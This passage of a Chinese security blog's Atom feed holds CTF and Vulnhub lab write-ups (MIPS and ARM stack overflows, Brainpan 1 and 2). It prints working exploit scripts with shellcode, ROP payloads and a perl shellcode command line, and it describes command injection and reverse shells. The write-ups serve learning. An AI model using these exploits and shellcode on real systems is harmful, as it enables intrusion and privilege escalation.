b&quot;\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span><br><span class="line"></span><br><span class="line">payload = &#x27;0&#x27;*4 + buf.ljust(0x70 - 4, &#x27;0&#x27;) + p32(stack_addr + 4)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendline(&#x27;exit&#x27;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>脚本运行结果：</p><p><img src="/img/Add/Add8.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;Add是MIPS架构的一道入门级别的栈溢出题，MIPS架构是一种采取精简指令集（RISC）的处理器架构。&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
    
    <category term="JarvisOJ" scheme="https://coldwave96.github.io/categories/WriteUPs/JarvisOJ/"/>
    
    
    <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
    
    <category term="Stack" scheme="https://coldwave96.github.io/tags/Stack/"/>
    
    <category term="MIPS" scheme="https://coldwave96.github.io/tags/MIPS/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ - Typo の Write-Up</title>
    <link href="https://coldwave96.github.io/2021/01/20/Typo/"/>
    <id>https://coldwave96.github.io/2021/01/20/Typo/</id>
    <published>2021-01-20T06:09:22.000Z</published>
    <updated>2021-01-20T06:09:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Typo作为ARM架构的题目，算是简单的入门题，让初学者能够了解ARM架构的函数调用过程。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>程序看起来是一个很有趣的打字游戏：</p><p><img src="/img/Typo/Typo1.png"></p><p>checksec发现是arm架构的32位程序：</p><p><img src="/img/Typo/Typo2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>再简单的温习一下ARM架构的函数调用：</p><p><img src="/img/Typo/Typo3.png"></p><ul><li><p>R0～R3通常用于传参，剩下的参数从右向左依次入栈，被调用者实现栈平衡，返回值存放在R0中；</p></li><li><p>r15  -&gt;  pc  &#x3D;&gt; 当前程序执行位置；</p></li><li><p>r14  -&gt;  lr  &#x3D;&gt; 连接寄存器：跳转指令自动把返回地址放入r14中；</p></li><li><p>r13  -&gt;  sp  &#x3D;&gt; 栈指针：指向上一帧的栈底；</p></li><li><p>r12  -&gt;  ip  &#x3D;&gt; ip 内部过程调用寄存器Intra-Procedure-call scratch register，其实就是r12；</p></li><li><p>r11  -&gt;  fp  &#x3D;&gt; 当前函数栈帧的栈底,也就是栈基地址FP；</p></li></ul><p>ARM架构的栈布局如下图所示：</p><p><img src="/img/Typo/Typo4.png"></p><p>main stack frame为调用函数的栈帧，func1 stack frame为当前函数(被调用者)的栈帧，栈底在高地址，栈向下增长。图中FP就是栈基址，它指向函数的栈帧起始地址；</p><p>SP则是函数的栈指针，它指向栈顶的位置。ARM压栈的顺序很是规矩，依次为当前函数指针PC、返回指针LR、栈指针SP、栈基址FP、传入参数个数及指针、本地变量和临时变量。先压栈的main stack 进入在高地址。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>回到Typo程序本身，在程序中有‘&#x2F;bin&#x2F;sh’字符串：</p><p><img src="/img/Typo/Typo5.png"></p><p>同时看到是sub_10ba8函数调用这个字符串，根据sub_10ba8函数发现这个函数其实就是system函数。在这个函数下面紧接着就是sub_110b4函数可以调用sub_10ba8即system函数。</p><p><img src="/img/Typo/Typo6.png"></p><p>有了system函数和’&#x2F;bin&#x2F;sh’，接下来需要的是找一个gadget控制R0寄存器：</p><p><img src="/img/Typo/Typo7.png"></p><p>根据找到的gadget构造这样的栈结构：</p><p><img src="/img/Typo/Typo8.png"></p><p>这样在程序返回时, 经过ROP Chain就会实现<code>r0 -&gt; “/bin/sh”</code>, <code>r4 -&gt; junk_data</code>, <code>pc = system_addr</code>的效果, 进而执行<code>system(&quot;/bin/sh&quot;)</code>来get shell。</p><p>最后就是寻找溢出点，确定padding的长度。</p><p><img src="/img/Typo/Typo9.png"></p><p>利用cyclic可以计算出padding长度112。</p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>所以解题脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># sh = process(&#x27;./typo&#x27;)</span><br><span class="line">sh = remote(&quot;pwn2.jarvisoj.com&quot;, 9888)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*112 + p32(0x20904) + p32(0x6c384) + p32(1) + p32(0x110b4)</span><br><span class="line"></span><br><span class="line">sh.sendafter(&#x27;quit&#x27;, &#x27;\n&#x27;)</span><br><span class="line">sh.recvline()</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/img/Typo/Typo10.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;Typo作为ARM架构的题目，算是简单的入门题，让初学者能够了解ARM架构的函数调用过程。&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
    
    <category term="JarvisOJ" scheme="https://coldwave96.github.io/categories/WriteUPs/JarvisOJ/"/>
    
    
    <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
    
    <category term="Stack" scheme="https://coldwave96.github.io/tags/Stack/"/>
    
    <category term="ARM" scheme="https://coldwave96.github.io/tags/ARM/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub - Brainpan 2 の Write-Up</title>
    <link href="https://coldwave96.github.io/2020/12/02/Brainpan2/"/>
    <id>https://coldwave96.github.io/2020/12/02/Brainpan2/</id>
    <published>2020-12-02T06:36:56.000Z</published>
    <updated>2020-12-02T06:36:56.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><code>Vulnhub</code>靶机<code>Brainpan</code>系列的第二台，有点小难度，还有点烧脑。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>首先确定靶机IP：</p><p><img src="/img/Brainpan2/Brainpan1.png"></p><p>扫描开放端口：</p><p><img src="/img/Brainpan2/Brainpan2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>和brainpan一样，9999端口开放了一个相似的程序，10000端口是个静态页面。</p><p>扫描目录，还是有bin目录：</p><p><img src="/img/Brainpan2/Brainpan3.png"></p><p>依然有个<code>brainpan.exe</code>文件，通过<code>file</code>命令发现是<code>jpeg</code>格式的图片：</p><p><img src="/img/Brainpan2/Brainpan4.png"></p><p>改后缀名打开后发现是超级玛丽……</p><p><img src="/img/Brainpan2/Brainpan5.png"></p><p>可是通过隐写或者夹层等多种方式也无法在其中找到任何有用的信息，只能回头去看9999端口的服务。</p><p>通过多次尝试，原来登录口令就是<code>GUEST</code>：</p><p><img src="/img/Brainpan2/Brainpan6.png"></p><p><code>HELP</code>命令查看各个命令内容：</p><p><img src="/img/Brainpan2/Brainpan7.png"></p><p>通过<code>FILES</code>指令列出文件：</p><p><img src="/img/Brainpan2/Brainpan8.png"></p><p>通过<code>VIEW</code>指令在<code>notes.txt</code>中发现是通过<code>popen(“command”, “r”)</code>实现的各种功能，猜测<code>VIEW</code>指令的实现方式是<code>popen(“cat &lt;filename&gt;”, “r”)</code>。</p><p><img src="/img/Brainpan2/Brainpan9.png"></p><p>尝试通过<code>&quot;;&quot;</code>绕过实现任意命令执行：</p><p><img src="/img/Brainpan2/Brainpan10.png"></p><p>执行python反弹shell的命令，获得靶机的shell：</p><p><img src="/img/Brainpan2/Brainpan11.png"></p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>尝试SUID提权：</p><p><img src="/img/Brainpan2/Brainpan12.png"></p><p>最后一个命令看起来比较有趣：</p><p><img src="/img/Brainpan2/Brainpan13.png"></p><p>进入对应文件夹下寻找信息：</p><p><img src="/img/Brainpan2/Brainpan14.png"></p><p>尝试将<code>msg_root</code>下载到本地查看：</p><p><img src="/img/Brainpan2/Brainpan15.png"></p><p>搭建python建议http服务器，访问<code>http://172.16.83.5:7788/msg_root</code>即可下载对应文件。</p><p>将<code>msg_root</code>通过IDA逆向：</p><p><img src="/img/Brainpan2/Brainpan16.png"></p><p><code>get_name</code>函数：</p><p><img src="/img/Brainpan2/Brainpan17.png"></p><p>根据<code>get_name</code>函数，对于<code>username</code>变量，当我们输入的字节数超过<code>0x11字节</code>后，并没有<code>“\x00”</code>这样的结束符，所以输入过长的时候可能造成缓冲区溢出。</p><p>当<code>fp(username, message)</code>;调用<code>save_msg</code>函数的时候便可以通过控制<code>username</code>长度实现覆盖<code>EIP</code>地址，从而跳转到覆盖的位置执行shellcode。</p><p><img src="/img/Brainpan2/Brainpan18.png"></p><p>根据<code>get_name</code>函数的汇编程序，在<code>0x08048729</code>地址可以控制<code>eax</code>寄存器，从而通过下一步的<code>call eax</code>指令实现任意地址跳转。</p><p>所以在<code>0x8048729</code>的位置下个断点：</p><p><img src="/img/Brainpan2/Brainpan19.png"></p><p>可以看到程序正常运行的时候，<code>ebp-4</code>的地址放着<code>save_msg</code>函数的地址，message部分的内容会被放到<code>0x804a008</code>的地址上去：</p><p><img src="/img/Brainpan2/Brainpan20.png"></p><p>所以我们通过<code>username</code>字段反复重复<code>0x804a008</code>这个地址以覆盖<code>eax</code>，然后将shellcode放到message段即可。</p><p>下面还是通过<code>msfvenom</code>模块生成shellcode：</p><p><img src="/img/Brainpan2/Brainpan21.png"></p><p>最后的<code>payload</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msg_root `perl -e <span class="string">&#x27;print &quot;\x04\x08\x08\xa0&quot;x8;&#x27;</span>` `perl -e <span class="string">&#x27;print &quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac\x5e\x3f\x89\x9f\xe1&quot;;&#x27;</span>`</span><br></pre></td></tr></table></figure><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>执行了payload之后可以看到获得了root权限:</p><p><img src="/img/Brainpan2/Brainpan22.png"></p><p>进入<code>/root</code>文件夹发现两个文件，打开<code>flag.txt</code>提示没有权限，打开<code>whatif.txt</code>提示我们还不是root权限？WTF？</p><p><img src="/img/Brainpan2/Brainpan23.png"></p><p>那就继续尝试SUID提权：</p><p><img src="/img/Brainpan2/Brainpan24.png"></p><p>多了一个<code>brainpan-1.8.exe</code>文件，查看文件夹寻找信息：</p><p><img src="/img/Brainpan2/Brainpan25.png"></p><p>先看一下<code>brainpan.7</code>文件是什么内容：</p><p><img src="/img/Brainpan2/Brainpan26.png"></p><p>文件最后给了提示，我们需要更改<code>brainpan.cfg</code>文件内容修改地址和端口：</p><p><img src="/img/Brainpan2/Brainpan27.png"></p><p>然后运行<code>brainpan-1.8.exe</code>，再连接上去通过命令执行反弹shell：</p><p><img src="/img/Brainpan2/Brainpan28.png"></p><p>接收到<code>puck</code>用户的shell：</p><p><img src="/img/Brainpan2/Brainpan29.png"></p><p>进入<code>/home/puck</code>文件夹寻找线索，有个<code>.backup</code>：</p><p><img src="/img/Brainpan2/Brainpan30.png"></p><p>进去看一下发现可能是前一个文件夹的备份：</p><p><img src="/img/Brainpan2/Brainpan31.png"></p><p>看下唯一有区别的<code>.bash_history</code>文件：</p><p><img src="/img/Brainpan2/Brainpan32.png"></p><p>果然，这里看出来了些端倪。原来是<code>root</code>和<code>root(space)</code>两个账号……</p><p>厉害的让人无F*UCK说……</p><p>通过备份里的<code>.ssh</code>可以ssh连接<code>root(space)</code>：</p><p><img src="/img/Brainpan2/Brainpan33.png"></p><p>但是却提示连接失败，猜测是换了ssh端口，看下配置文件：</p><p><img src="/img/Brainpan2/Brainpan34.png"></p><p>果然端口被改到了2222，再次尝试：</p><p><img src="/img/Brainpan2/Brainpan35.png"></p><p>果然是<code>root(space)</code>账号，再次去查看<code>flag.txt</code>：</p><p><img src="/img/Brainpan2/Brainpan36.png"></p><p>城里人真会玩系列：</p><p><img src="/img/Brainpan2/Brainpan37.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Vulnhub&lt;/code&gt;靶机&lt;code&gt;Brainpan&lt;/code&gt;系列的第二台，有点小难度，还有点烧脑。&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
    
    <category term="Vulnhub" scheme="https://coldwave96.github.io/categories/WriteUPs/Vulnhub/"/>
    
    
    <category term="Reverse" scheme="https://coldwave96.github.io/tags/Reverse/"/>
    
    <category term="Web" scheme="https://coldwave96.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub - Brainpan の Write-Up</title>
    <link href="https://coldwave96.github.io/2020/11/20/Brainpan/"/>
    <id>https://coldwave96.github.io/2020/11/20/Brainpan/</id>
    <published>2020-11-20T05:25:49.000Z</published>
    <updated>2020-11-20T05:25:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><code>Vulnhub</code>靶机<code>Brainpan</code>系列的第一台。整体难度中等。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>首先找靶机IP：</p><p><img src="/img/Brainpan1/Brainpan1.png"></p><p>扫描靶机开放端口：</p><p><img src="/img/Brainpan1/Brainpan2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>9999端口：</p><p><img src="/img/Brainpan1/Brainpan3.png"></p><p>看起来需要一个密码，只能先跳过。</p><p>10000端口是http的服务，浏览器看上去只是一张图片的静态页面：</p><p><img src="/img/Brainpan1/Brainpan4.png"></p><p>目录扫描发现有个bin目录：</p><p><img src="/img/Brainpan1/Brainpan5.png"></p><p>访问bin目录，有个exe文件：</p><p><img src="/img/Brainpan1/Brainpan6.png"></p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>通过IDA逆向之后发现这是9999端口运行的程序：</p><p><img src="/img/Brainpan1/Brainpan7.png"></p><p>在程序中发现一个<code>get_reply</code>函数：</p><p><img src="/img/Brainpan1/Brainpan8.png"></p><p>在函数中可以看到调用strcpy，而在主函数中&amp;Dest长度可以到1000字节，get_reply函数中Source只有0x208字节即520字节。所以这里存在栈溢出漏洞，当填充了<code>520(Source_data)+4(EBP)</code>总共524字节的数据之后就可以控制函数的返回地址。</p><p>由于程序中没有可以直接getshell的函数，所以需要我们将shellcode写入的buf中，通过jmp esp命令控制程序跳转到buf执行命令。</p><p>在程序中找到311712F3的地址有jmp esp指令，再通过msfvenom生成payload：</p><p><img src="/img/Brainpan1/Brainpan9.png"></p><p>最终的利用脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">target_ip = <span class="string">&#x27;172.16.83.3&#x27;</span></span><br><span class="line">target_port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># padding with &#x27;a&#x27;</span></span><br><span class="line">padding = <span class="string">&#x27;\x61&#x27;</span> * <span class="number">524</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># address of &#x27;jmp esp&#x27; command - 0x311712F3</span></span><br><span class="line">jmp_esp = <span class="string">&#x27;\xF3\x12\x17\x31&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode</span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x90&quot;</span> * <span class="number">30</span></span><br><span class="line">buf += <span class="string">b&quot;\xbf\x23\x22\x77\xf6\xd9\xe1\xd9\x74\x24\xf4\x5a\x33&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x7a\x12\x03\x7a\x12\x83\xc9\xde\x95&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x03\x3c\xc4\xad\x0f\x6d\xb9\x02\xba\x93\xb4\x44\x8a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf5\x0b\x06\x78\xa0\x23\x38\xb2\xd2\x0d\x3e\xb5\xba&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x21\xd0\x16\x38\x52\xd3\x98\x2d\xfe\x5a\x79\xfd\x98&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x0c\x2b\xae\xd7\xae\x42\xb1\xd5\x31\x06\x59\x88\x1e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd4\xf1\x3c\x4e\x35\x63\xd4\x19\xaa\x31\x75\x93\xcc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x05\x72\x6e\x8e&quot;</span></span><br><span class="line"></span><br><span class="line">payload = padding + jmp_esp + buf</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((target_ip, target_port))</span><br><span class="line"></span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(payload)</span><br></pre></td></tr></table></figure><p>运行脚本之后就可以获取反弹shell：</p><p><img src="/img/Brainpan1/Brainpan10.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>根据之前靶机题权最简单的方式，直接查看sudo权限，提示我们可以以root权限运行<code>/home/anansi/bin/anansi_util</code>：</p><p><img src="/img/Brainpan1/Brainpan11.png"></p><p>sudo执行之后根据命令提示可以直接接命令，所以当接上<code>/bin/bash</code>命令之后就可以获得root权限的shell。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Vulnhub&lt;/code&gt;靶机&lt;code&gt;Brainpan&lt;/code&gt;系列的第一台。整体难度中等。&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
    
    <category term="Vulnhub" scheme="https://coldwave96.github.io/categories/WriteUPs/Vulnhub/"/>
    
    
    <category term="Reverse" scheme="https://coldwave96.github.io/tags/Reverse/"/>
    
    <category term="Web" scheme="https://coldwave96.github.io/tags/Web/"/>
    
  </entry>
  
</feed>
